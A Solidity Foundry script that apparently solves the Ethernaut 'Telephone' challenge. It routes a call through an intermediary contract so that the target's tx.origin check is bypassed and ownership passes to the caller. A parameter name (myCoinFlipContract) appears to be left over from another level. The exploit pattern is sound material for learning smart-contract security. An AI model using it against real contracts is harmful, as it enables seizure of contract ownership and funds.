// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Script, console} from "forge-std/Script.sol";
import {Telephone} from "../src/Telephone.sol";

contract ChangeOwnerTelephone is Script {
    function changeOwnerTelephone(address myCoinFlipContract) public {
        vm.startBroadcast();
        InteractWithTelephone interactWithTelephone = new InteractWithTelephone(myCoinFlipContract);
        interactWithTelephone.interact();
        vm.stopBroadcast();
    }

    function run(address myCoinFlipContract) external {
        changeOwnerTelephone(myCoinFlipContract);
    }
}

contract InteractWithTelephone {
    address private immutable telephoneContract;

    constructor(address _telephoneContract) {
        telephoneContract = _telephoneContract;
    }

    function interact() public {
        Telephone telephone = Telephone(telephoneContract);
        telephone.changeOwner(msg.sender);
    }
}
